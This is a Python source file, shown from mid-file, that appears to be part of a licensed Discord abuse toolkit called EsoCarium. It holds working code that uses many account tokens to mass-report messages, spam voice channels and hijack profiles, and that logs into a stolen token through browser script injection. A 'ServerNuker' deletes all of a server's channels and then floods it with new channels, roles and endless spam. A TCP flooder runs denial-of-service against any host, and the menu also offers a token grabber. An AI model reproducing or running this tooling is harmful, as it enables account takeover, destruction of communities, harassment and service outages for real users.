    os.remove(os.path.join(filename))
    def _change_pfp(token,_):
       headers = self.__headers(token)
       gateway = Gateway()
       gateway.run_gateway(token)
       try:
          res = self.session.patch('https://discordapp.com/api/v9/users/@me', headers=headers,cookies=self.cookies, json={"avatar":"data:image/png;base64,"+b64image})
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Succesfully Added Profile Picture : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Add Profile Picture : {}'.format(token),1))
       except:
          pass
       gateway.close_ws()
    for token in tokens:threading.Thread(target=_change_pfp, args=(token, True)).start()
    input()
  def VCSpammer(self):
    guildid = Write.Input('Server ID > ', Colors.red_to_yellow, 0.025)
    channelid = Write.Input('Channel ID > ', Colors.red_to_yellow, 0.025)
    def _join_vc(token,_):
       headers = self.__headers(token)
       gateway = Gateway()
       ws = gateway.return_ws()
       gateway.run_gateway(token)
       ws.send(json.dumps({"op": 4,"d": {"guild_id": guildid,"channel_id": channelid,"self_mute": False,"self_deaf": False, "self_stream?": True, "self_video": True}}))
       ws.send(json.dumps({"op": 18,"d": {"type": "guild","guild_id": guildid,"channel_id": channelid,"preferred_region": "singapore"}}))
       ws.send(json.dumps({"op": 1,"d": None}))
       def __sound():
          while True:res = self.session.post('https://discord.com/api/v9/channels/{}/voice-channel-effects'.format(channelid), headers=headers, json=random.choice([
                {"sound_id":"1","emoji_id":None,"emoji_name":"🦆","override_path":"default_quack.mp3"},
                {"sound_id":"2","emoji_id":None,"emoji_name":"🔊","override_path":"default_airhorn.mp3"},
                {"sound_id":"6","emoji_id":None,"emoji_name":"🥁","override_path":"default_ba_dum_tss.mp3"},
                {"sound_id":"4","emoji_id":None,"emoji_name":"👏","override_path":"default_golf_clap.mp3"}
          ]))
       __sound()
    for token in tokens:threading.Thread(target=_join_vc, args=(token, True)).start()
    input()
  def MassReport(self):
    messageid = Write.Input('Message ID > ', Colors.red_to_yellow, 0.025)
    channelid = Write.Input('Channel ID > ', Colors.red_to_yellow, 0.025)
    def __report(token,_):
       headers = self.__headers(token)
       try:
          res=self.session.post('https://discord.com/api/v9/reporting/message', headers=headers, json={"version":"1.0","variant":"3","language":"en","breadcrumbs":[3,31],"elements":{},"name":"message","channel_id":channelid,"message_id":messageid},cookies=self.cookies)
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Message Successfully Reported : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Report Message : {}'.format(token),1))
       except:
          pass   
    for token in tokens:threading.Thread(target=__report, args=(token, True)).start()
    input()
  def ChangeBIO(self):
    bio = Write.Input('Bio > ', Colors.red_to_yellow, 0.025)
    def __change_bio(token,_):
       gateway = Gateway()
       gateway.run_gateway(token)
       headers = self.__headers(token)
       try:
          res=res = self.session.patch('https://discord.com/api/v9/users/@me/profile', headers=headers,cookies=self.cookies, json={'bio': bio})
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Bio Successfully Changed : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Change Bio : {}'.format(token),1))
       except:
          pass   
       gateway.close_ws()
    for token in tokens:threading.Thread(target=__change_bio, args=(token, True)).start()
    input()
  def ChangeDisplayName(self):
    displayname = Write.Input('Displayname > ', Colors.red_to_yellow, 0.025)
    def __change_display_name(token,_):
       gateway = Gateway()
       gateway.run_gateway(token)
       headers = self.__headers(token)
       try:
          res = self.session.patch('https://discord.com/api/v9/users/@me', headers=headers,cookies=self.cookies, json={'global_name': displayname})
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Displayname Successfully Changed : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to Change Displayname : {}'.format(token),1))
       except:
          pass   
       gateway.close_ws()
    for token in tokens:threading.Thread(target=__change_display_name, args=(token, True)).start()
    input() 
  def AddReaction(self):
    channelid = Write.Input('Channel ID > ', Colors.red_to_yellow, 0.025)
    messageid = Write.Input('Message ID > ', Colors.red_to_yellow, 0.025)
    emoji = Write.Input('Emoji > ', Colors.red_to_yellow, 0.025)
    def __react(token,_):
       gateway = Gateway()
       gateway.run_gateway(token)
       headers = self.__headers(token)
       try:
          res=res = self.session.put('https://discord.com/api/v9/channels/{0}/messages/{1}/reactions/{2}/@me?location=Message&type=0'.format(channelid,messageid,emoji), headers=headers,cookies=self.cookies)
          if res.status_code in [200,204]:print(Colorate.Horizontal(Colors.green_to_white, 'Successfully Reacted : {}'.format(token),1))
          else:print(Colorate.Horizontal(Colors.red_to_white, 'Failed to React : {}'.format(token),1))
       except:
          pass   
       gateway.close_ws()
    for token in tokens:threading.Thread(target=__react, args=(token, True)).start()
    input() 
  def TokenLogin(self):
     token = Write.Input('Token > ', Colors.red_to_yellow, 0.025)
     js = f"""
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"{token}"`
location.reload();"""
     options = uc.ChromeOptions()
     driver = uc.Chrome(options=options, driver_executable_path='chromedriver.exe')
     driver.get('https://discord.com/login')
     driver.execute_script(js)
     input()
  def ServerNuker(self):
    authorzation = Write.Input('Bot Token > ', Colors.red_to_yellow, 0.025)
    guildid = Write.Input('Server ID > ', Colors.red_to_yellow, 0.025)
    channelname = Write.Input('Channels Name > ', Colors.red_to_yellow, 0.025)
    rolename = Write.Input('Roles Name > ', Colors.red_to_yellow, 0.025)
    message = Write.Input('Message > ', Colors.red_to_yellow, 0.025)
    headers = {'Accept':'*/*','Accept-Encoding':'gzip, deflate, br'}
    headers['Authorization'] = 'Bot {}'.format(authorzation)
    client = httpx.Client(headers=headers)
    def __delete_channels():
      channels_ids = [channel['id'] for channel in json.loads(client.get('https://discord.com/api/v9/guilds/{}/channels'.format(guildid)).text)]
      def __delete_channel(channelid, _):
          client.delete('https://discord.com/api/v9/channels/{}'.format(channelid))
      for channelid in channels_ids:threading.Thread(target=__delete_channel, args=(channelid, True)).start()
      print(Colorate.Horizontal(Colors.green_to_white, 'Channels Deleted Successfully',1))
    def __create_channels():
      def __create_channel(name, _):
        client.post('https://discord.com/api/v9/guilds/{}/channels'.format(guildid), json={"type":0,"name":name,"permission_overwrites":[]})
      for i in range(100):threading.Thread(target=__create_channel, args=(channelname, True)).start()
      print(Colorate.Horizontal(Colors.green_to_white, '100 Channels Created Successfully',1))
    def __spam_messages():
      def __send_message(channelid, message):
          while True:client.post('https://discord.com/api/v9/channels/{}/messages'.format(channelid), json={'content': message})
      channels_ids = [channel['id'] for channel in json.loads(client.get('https://discord.com/api/v9/guilds/{}/channels'.format(guildid)).text)]
      print(Colorate.Horizontal(Colors.green_to_white, 'Spamming Started',1))
      while True:
        for channelid in channels_ids:threading.Thread(target=__send_message, args=(channelid, message)).start()
    def __create_roles():
      def __create_role(name, _):
        client.post('https://discord.com/api/v9/guilds/{}/roles'.format(guildid), json={"name":name,"color":0,"permissions":"0"})
      for i in range(100):threading.Thread(target=__create_role, args=(rolename, True)).start()
      print(Colorate.Horizontal(Colors.green_to_white, '100 Roles Created Successfully',1))
    threading.Thread(target=__delete_channels).start()
    threading.Thread(target=__create_roles).start()
    threading.Thread(target=__create_channels).start();time.sleep(3)
    threading.Thread(target=__spam_messages).start()
  def AccountNuker(self):
     pass

class OtherTools:
  def __init__(self):
    pass
  def dosser(self):
    host = Write.Input('Host > ', Colors.red_to_yellow, 0.025)
    port = int(Write.Input('Port > ', Colors.red_to_yellow, 0.025))
    target = (host, port)
    def open_connection(conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP):
        sock = socket(conn_type, sock_type, proto_type)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect(target)
        return sock
    while True:
      try:sock = open_connection(AF_INET, SOCK_STREAM);sock.send(randbytes(1024))
      except:pass
  def IPScanner(self):
    ip = Write.Input('Ip > ', Colors.red_to_yellow, 0.025)
    res=requests.get(f'https://ipapi.co/{ip}/json/').json()
    print(res)
    input()
  def RandIPGen(self):
    ipsnum = int(Write.Input("Ip's Number > ", Colors.red_to_yellow, 0.025))
    for i in range(ipsnum):
       ip = ''.join(random.choice(string.digits)for i in range(3))+'.'+''.join(random.choice(string.digits)for i in range(2))+'.'+''.join(random.choice(string.digits)for i in range(3))+'.'+''.join(random.choice(string.digits)for i in range(3))
       print(Colorate.Horizontal(Colors.green_to_white, ip,1))
    input()
  def ProxiesScrape(self):
    proxysources = [
	["http://spys.me/proxy.txt","%ip%:%port% "],
	["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
	["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
	["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
	["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
	["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
	["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
	["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
	["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
	["https://www.proxy-list.download/api/v0/get?l=en&t=https", '"IP": "%ip%", "PORT": "%port%",'],
	["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
	["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
	["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
	["https://proxylist.icu/", "<td>%ip%:%port%</td><td>http<"],
	["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
	["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
	["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
	["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
	["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
	["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
	["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
]
    for proxy in proxysources:
      url = proxy[0]
      custom_regex = proxy[1]
      proxylist = requests.get(url, timeout=5).text
      proxylist = proxylist.replace('null', '"N/A"')
      custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
      custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
      for proxy in re.findall(re.compile(custom_regex), proxylist):
        print(Colorate.Horizontal(Colors.green_to_white, proxy[0] + ":" + proxy[1],1))
    input()
  def PortScanner(self):
    host = Write.Input("Host > ", Colors.red_to_yellow, 0.025)
    start_port = 1
    end_port = int(Write.Input("Port range > 1-", Colors.red_to_yellow, 0.025))

    def check_port(host, port):
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                print(Colorate.Horizontal(Colors.green_to_white,f"Port {port} Is Open",1))
            sock.close()
        except error:
            pass
        
    for port in range(start_port, end_port + 1):
        threading.Thread(target=check_port, args=(host, port)).start()
        if port == end_port:
           print(Colorate.Horizontal(Colors.green_to_white,f"Scanning Completed",1))
    input()
class EsoCariumUi:
  def __init__(self):
    self.discordtools = DiscordTools()
    self.othertools = OtherTools()
  def run(self):
    System.Clear()
    print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(r'''     
                         ...
                       ;::::;
                     ;::::; :;          Rotto And Hura On Top!
                   ;:::::'   :;       
                  ;:::::;     ;.
                 ,:::::'       ;           OOO\
                 ::::::;       ;          OOOOO\
                 ;:::::;       ;         OOOOOOOO
                ,;::::::;     ;'         / OOOOOOO
              ;:::::::::`. ,,,;.        /  / DOOOOOO
            .';:::::::::::::::::;,     /  /     DOOOO
           ,::::::;::::::;;;;::::;,   /  /        DOOO
          ;`::::::`'::::::;;;::::: ,#/  /          DOOO
          :`:::::::`;::::::;;::: ;::#  /            DOOO
          ::`:::::::`;:::::::: ;::::# /              DOO
          `:`:::::::`;:::::: ;::::::#/               DOO
           :::`:::::::`;; ;:::::::::##                OO
           ::::`:::::::`;::::::::;:::#                OO
           `:::::`::::::::::::;'`:;::#                O
            `:::::`::::::::;' /  / `:#
             ::::::`:::::;'  /  /   `#       
     ▄████████   ▄████████    ▄██████▄   ▄████████    ▄████████    ▄████████  ▄█   ███    █▄    ▄▄▄▄███▄▄▄▄   
     ███    ███  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███  ███    ███ ▄██▀▀▀███▀▀▀██▄ 
     ███    █▀   ███    █▀    ███    ███ ███    █▀    ███    ███   ███    ███ ███▌ ███    ███ ███   ███   ███ 
    ▄███▄▄▄      ███          ███    ███ ███          ███    ███  ▄███▄▄▄▄██▀ ███▌ ███    ███ ███   ███   ███ 
    ▀▀███▀▀▀     ▀███████████ ███    ███ ███        ▀███████████ ▀▀███▀▀▀▀▀   ███▌ ███    ███ ███   ███   ███ 
      ███    █▄           ███ ███    ███ ███    █▄    ███    ███ ▀███████████ ███  ███    ███ ███   ███   ███ 
      ███    ███    ▄█    ███ ███    ███ ███    ███   ███    ███   ███    ███ ███  ███    ███ ███   ███   ███ 
      ██████████  ▄████████▀   ▀██████▀  ████████▀    ███    █▀    ███    ███ █▀   ████████▀   ▀█   ███   █▀  
    '''),1))

    print(Colorate.Horizontal(Colors.red_to_yellow, Box.Lines('Discord Tools'))+'\n'+Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(Box.DoubleCube('''
    01 > Joiner          02 > Leaver             03 > Spammer             04 > Token Checker   05 > DM Spammer
    06 > Server MassDM   07 > Friend Sender      08 > Hypesquad Joiner    09 > Token Onliner   10 > PFP Changer
    11 > Bio Changer     12 > Display Changer    13 > Server Nuker        14 > Account Nuker   15 > Reaction Adder
    16 > Vc Spammer      17 > Mass Report        18 > Token Login         19 > Token Grabber\n\n''')))+'\n'+Colorate.Horizontal(Colors.red_to_yellow, Box.Lines('Generic Tools'))+'\n'+Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(Box.DoubleCube('''
    20 > DoS Attack        21 > IP Scanner         22 > Rand IP Generator
    23 > Proxies Scraper   24 > Port Scanner\n\n'''))))
    opt = Write.Input('Option > ', Colors.red_to_yellow, 0.025)
    try:opt = int(opt)
    except:self.run()
    if opt == 1:self.discordtools.Joiner();self.run()
    elif opt == 2:self.discordtools.Leaver();self.run()
    elif opt == 3:self.discordtools.Spammer();self.run()
    elif opt == 4:self.discordtools.TokenChecker();self.run()
    elif opt == 5:self.discordtools.DMSpammer();self.run()
    elif opt == 6:self.discordtools.ServerMassDM();self.run()
    elif opt == 7:self.discordtools.FriendSender();self.run()
    elif opt == 8:self.discordtools.HypesquadJoiner();self.run()
    elif opt == 9:self.discordtools.TokenOnliner();self.run()
    elif opt == 10:self.discordtools.PFPChanger();self.run()
    elif opt == 11:self.discordtools.ChangeBIO();self.run()
    elif opt == 12:self.discordtools.ChangeDisplayName();self.run()
    elif opt == 13:self.discordtools.ServerNuker()
    elif opt == 14:self.discordtools.AccountNuker();self.run()
    elif opt == 15:self.discordtools.AddReaction();self.run()
    elif opt == 16:self.discordtools.VCSpammer();self.run()
    elif opt == 17:self.discordtools.MassReport();self.run()
    elif opt == 18:self.discordtools.TokenLogin();self.run()

    #elif opt == 19:self.discordtools.

    elif opt == 20:self.othertools.dosser();self.run()
    elif opt == 21:self.othertools.IPScanner();self.run()
    elif opt == 22:self.othertools.RandIPGen();self.run()
    elif opt == 23:self.othertools.ProxiesScrape();self.run()
    elif opt == 24:self.othertools.PortScanner();self.run()
def register():
 key = Write.Input('License Key > ', Colors.red_to_yellow, 0.025)
 user = Write.Input('Username > ', Colors.red_to_yellow, 0.025)
 passw = Write.Input('Password > ', Colors.red_to_yellow, 0.025)
 keyauthapp.register(user, passw, key)
 EsoCariumUi().run()
def login():
 user = Write.Input('Username > ', Colors.red_to_yellow, 0.025)
 passw = Write.Input('Password > ', Colors.red_to_yellow, 0.025)
 keyauthapp.login(user, passw)
 EsoCariumUi().run()
def home():
  System.Clear()
  print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(r'''     
                         ...
                       ;::::;
                     ;::::; :;          Rotto And Hura On Top!
                   ;:::::'   :;       
                  ;:::::;     ;.
                 ,:::::'       ;           OOO\
                 ::::::;       ;          OOOOO\
                 ;:::::;       ;         OOOOOOOO
                ,;::::::;     ;'         / OOOOOOO
              ;:::::::::`. ,,,;.        /  / DOOOOOO
            .';:::::::::::::::::;,     /  /     DOOOO
           ,::::::;::::::;;;;::::;,   /  /        DOOO
          ;`::::::`'::::::;;;::::: ,#/  /          DOOO
          :`:::::::`;::::::;;::: ;::#  /            DOOO
          ::`:::::::`;:::::::: ;::::# /              DOO
          `:`:::::::`;:::::: ;::::::#/               DOO
           :::`:::::::`;; ;:::::::::##                OO
           ::::`:::::::`;::::::::;:::#                OO
           `:::::`::::::::::::;'`:;::#                O
            `:::::`::::::::;' /  / `:#
             ::::::`:::::;'  /  /   `#       
     ▄████████   ▄████████    ▄██████▄   ▄████████    ▄████████    ▄████████  ▄█   ███    █▄    ▄▄▄▄███▄▄▄▄   
     ███    ███  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███  ███    ███ ▄██▀▀▀███▀▀▀██▄ 
     ███    █▀   ███    █▀    ███    ███ ███    █▀    ███    ███   ███    ███ ███▌ ███    ███ ███   ███   ███ 
    ▄███▄▄▄      ███          ███    ███ ███          ███    ███  ▄███▄▄▄▄██▀ ███▌ ███    ███ ███   ███   ███ 
    ▀▀███▀▀▀     ▀███████████ ███    ███ ███        ▀███████████ ▀▀███▀▀▀▀▀   ███▌ ███    ███ ███   ███   ███ 
      ███    █▄           ███ ███    ███ ███    █▄    ███    ███ ▀███████████ ███  ███    ███ ███   ███   ███ 
      ███    ███    ▄█    ███ ███    ███ ███    ███   ███    ███   ███    ███ ███  ███    ███ ███   ███   ███ 
      ██████████  ▄████████▀   ▀██████▀  ████████▀    ███    █▀    ███    ███ █▀   ████████▀   ▀█   ███   █▀  
    '''),1))
  print(Colorate.Horizontal(Colors.red_to_yellow,f">> 1 - Login\n>> 2 - Register"))
  opt = int(Write.Input('Option > ', Colors.red_to_yellow, 0.025))
  if opt == 1:
    login()
  if opt == 2:
    register()
  # if opt is not 1 or 2:
  #    home()
if __name__ == '__main__':
  EsoCariumUi().run()